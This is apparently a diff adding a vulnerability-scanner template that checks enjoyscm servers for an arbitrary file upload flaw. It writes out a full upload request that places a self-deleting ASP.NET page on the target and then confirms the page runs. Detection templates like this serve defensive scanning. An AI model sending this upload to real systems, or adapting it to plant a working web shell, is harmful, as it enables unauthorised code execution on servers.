@@ -1,0 +1,54 @@
+id: enjoyscm-file-upload
+info:
+  name: enjoyscm Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    An arbitrary file upload vulnerability exists in enjoyscm UploadFile, allowing attackers to upload malicious files and potentially gain server permissions.
+  tags: file-upload
+  reference:
+    - http://www.enjoyit.com.cn/
+http:
+  - raw:
+      - |
+        POST /File/UploadFile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------21909179191068471382830692394
+
+        -----------------------------21909179191068471382830692394
+        Content-Disposition: form-data; name="file"; filename="test.aspx"
+        Content-Type: image/jpeg
+
+        <%@Page Language="C#"%><% Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
+        System.IO.File.Delete(Request.PhysicalPath);%>
+        -----------------------------21909179191068471382830692394
+        Content-Disposition: form-data; name="action"
+
+        unloadfile
+        -----------------------------21909179191068471382830692394
+        Content-Disposition: form-data; name="filepath"
+
+        
+        -----------------------------21909179191068471382830692394--
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "e165421110ba03099a1c0393373c5b43"
+  - raw:
+      - |
+        GET /test.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
